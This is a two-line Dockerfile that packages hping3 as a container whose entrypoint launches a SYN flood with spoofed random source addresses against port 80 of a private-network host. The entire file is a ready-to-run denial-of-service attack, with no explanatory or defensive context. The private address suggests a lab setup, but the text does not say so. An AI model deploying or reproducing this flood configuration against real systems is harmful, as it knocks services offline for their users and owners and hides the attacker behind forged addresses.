FROM sflow/hping3:latest

ENTRYPOINT ["hping3", "172.19.14.138", "-p", "80", "-S", "--flood", "--rand-source"]


